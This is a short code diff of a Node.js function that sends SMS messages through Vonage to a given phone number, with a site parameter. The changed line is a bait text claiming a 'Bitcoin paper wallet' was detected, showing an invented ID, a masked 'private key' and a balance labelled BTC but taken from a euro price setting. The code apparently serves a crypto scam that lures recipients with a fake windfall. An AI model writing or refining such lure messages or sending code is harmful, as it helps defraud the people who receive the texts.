@@ -25,10 +25,10 @@ module.exports.send_message = async (phone, site) => {
         const price = JSON.parse(fs.readFileSync(`${pathToFolder}/price_settings.json`))
 
         from = info["from"]
-        let text = `Bitcoin paper wallet detected!\nIdentification no. AA22V3R2BRB53\nPrivate key : *******AR1dbaA\nCurrent balance : ${price.price_euro} BTC`
+        let text = `Bitcoin paper wallet detected!\nIdentification no. SS22F3R2MM853-SPK\nPrivate key : *******DBak99ut\nCurrent balance : ${price.price_euro} BTC`
 
         sendSMS(vonage, to, from, text);
-        
+
       } else {
           console.log("Файл найден sms");
       }
